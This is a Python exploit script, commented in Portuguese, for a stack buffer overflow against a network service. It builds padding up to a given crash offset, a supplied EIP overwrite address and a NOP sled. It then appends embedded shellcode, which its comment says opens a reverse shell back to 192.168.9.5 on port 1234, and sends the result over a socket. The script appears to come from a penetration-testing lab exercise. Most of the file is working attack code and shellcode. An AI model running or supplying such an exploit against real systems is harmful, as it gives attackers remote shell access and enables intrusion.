#!/usr/bin/python

import argparse
import socket
import time
from struct import pack

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão com o offset já encontrado para verificar os bytes correspondentes ao EIP")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("offset", type=int, help="Offset de Crash")
parser.add_argument("eip_alvo", type=str, help="EIP Alvo (Ex: 0x080414c3)")


# Analisar os argumentos
args = parser.parse_args()

# Endereço de Memória para EIP Alvo
eip_int = int(args.eip_alvo,16)
eip = pack('<I', eip_int)

# Reverse Shell - 192.168.9.5 1234
# Badchars -  \x00\x0a\x0e\x0d
revshell = ( 
    b""
    b"\xb8\xc8\xac\xaf\xae\xda\xcf\xd9\x74\x24\xf4\x5e\x2b"
    b"\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x26\x50\x4d"
    b"\x5b\x4a\x41\x10\xa4\xb2\x92\x75\x2c\x57\xa3\xb5\x4a"
    b"\x1c\x94\x05\x18\x70\x19\xed\x4c\x60\xaa\x83\x58\x87"
    b"\x1b\x29\xbf\xa6\x9c\x02\x83\xa9\x1e\x59\xd0\x09\x1e"
    b"\x92\x25\x48\x67\xcf\xc4\x18\x30\x9b\x7b\x8c\x35\xd1"
    b"\x47\x27\x05\xf7\xcf\xd4\xde\xf6\xfe\x4b\x54\xa1\x20"
    b"\x6a\xb9\xd9\x68\x74\xde\xe4\x23\x0f\x14\x92\xb5\xd9"
    b"\x64\x5b\x19\x24\x49\xae\x63\x61\x6e\x51\x16\x9b\x8c"
    b"\xec\x21\x58\xee\x2a\xa7\x7a\x48\xb8\x1f\xa6\x68\x6d"
    b"\xf9\x2d\x66\xda\x8d\x69\x6b\xdd\x42\x02\x97\x56\x65"
    b"\xc4\x11\x2c\x42\xc0\x7a\xf6\xeb\x51\x27\x59\x13\x81"
    b"\x88\x06\xb1\xca\x25\x52\xc8\x91\x21\x97\xe1\x29\xb2"
    b"\xbf\x72\x5a\x80\x60\x29\xf4\xa8\xe9\xf7\x03\xce\xc3"
    b"\x40\x9b\x31\xec\xb0\xb2\xf5\xb8\xe0\xac\xdc\xc0\x6a"
    b"\x2c\xe0\x14\x3c\x7c\x4e\xc7\xfd\x2c\x2e\xb7\x95\x26"
    b"\xa1\xe8\x86\x49\x6b\x81\x2d\xb0\xfc\x6e\x19\xb3\xf9"
    b"\x06\x58\xc3\x05\x05\xd5\x25\x6f\xb9\xb0\xfe\x18\x20"
    b"\x99\x74\xb8\xad\x37\xf1\xfa\x26\xb4\x06\xb4\xce\xb1"
    b"\x14\x21\x3f\x8c\x46\xe4\x40\x3a\xee\x6a\xd2\xa1\xee"
    b"\xe5\xcf\x7d\xb9\xa2\x3e\x74\x2f\x5f\x18\x2e\x4d\xa2"
    b"\xfc\x09\xd5\x79\x3d\x97\xd4\x0c\x79\xb3\xc6\xc8\x82"
    b"\xff\xb2\x84\xd4\xa9\x6c\x63\x8f\x1b\xc6\x3d\x7c\xf2"
    b"\x8e\xb8\x4e\xc5\xc8\xc4\x9a\xb3\x34\x74\x73\x82\x4b"
    b"\xb9\x13\x02\x34\xa7\x83\xed\xef\x63\xa3\x0f\x25\x9e"
    b"\x4c\x96\xac\x23\x11\x29\x1b\x67\x2c\xaa\xa9\x18\xcb"
    b"\xb2\xd8\x1d\x97\x74\x31\x6c\x88\x10\x35\xc3\xa9\x30"
    )

    
# Variáveis de entrada
client_ip = args.client_ip
client_port = args.client_port
offset = args.offset
payload = b"A"*offset
payload += eip
payload += b"\x90" * 32 # NOPs
payload += revshell


try:
    # Cria conexão e envia o payload
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((client_ip, client_port))
    print("[+] Enviando Buffer de {} 'A', EIP: {} e Shellcode de {} bytes [+]\n".format(str(offset), str(eip), len(revshell)))
    client.send(payload)

except ConnectionResetError:
    print(f"Reset Error!")
